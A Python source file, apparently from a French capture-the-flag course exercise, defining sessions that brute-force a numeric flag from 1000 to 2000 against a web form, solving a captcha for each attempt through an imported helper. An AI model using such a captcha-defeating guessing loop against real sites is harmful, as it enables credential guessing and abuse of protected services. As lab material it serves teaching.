import requests
from src.tp3.utils.captcha import Captcha


class Session:
    def __init__(self, url, flag_start=1000, flag_end=2000):
        self.url = url
        self.captcha_value = ""
        self.flag_value = flag_start
        self.flag_end = flag_end
        self.valid_flag = ""
        self.response = None
        self.http_session = requests.Session()

    def prepare_request(self):
        captcha = Captcha(self.url)
        captcha.capture(session=self.http_session)
        captcha.solve()
        self.captcha_value = captcha.get_value()

    def submit_request(self):
        self.response = self.http_session.post(self.url, data={
            "flag": str(self.flag_value),
            "captcha": self.captcha_value,
            "submit": "Submit",
        })

    def process_response(self):
        if self.response is None:
            return False

        body = self.response.text

        if "Incorrect flag." in body:
            self.flag_value += 1
            if self.flag_value > self.flag_end:
                print("Tous les flags ont été testés sans succès.")
                return True
            return False

        self.valid_flag = str(self.flag_value)
        print(f"Flag trouvé : {self.valid_flag}")
        return True

    def get_flag(self):
        return self.valid_flag


class Session2(Session):
    def process_response(self):
        if self.response is None:
            return False

        body = self.response.text

        lines = [line.strip() for line in body.splitlines() if line.strip()]
        candidate = lines[-1]

        if not candidate.startswith("<") and len(candidate) > 0:
            self.valid_flag = candidate
            print(f"Flag trouvé : {self.valid_flag}")
            return True

        return False